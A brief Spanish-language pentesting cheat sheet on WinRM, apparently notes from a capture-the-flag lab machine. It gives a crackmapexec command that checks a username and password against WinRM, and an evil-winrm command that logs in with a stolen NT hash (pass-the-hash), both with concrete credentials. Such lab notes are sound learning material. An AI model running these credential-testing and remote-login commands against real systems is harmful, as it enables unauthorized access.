# WINRM

## Validación de credenciales

```null
crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'
```

## Autenticación por NT

```null
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```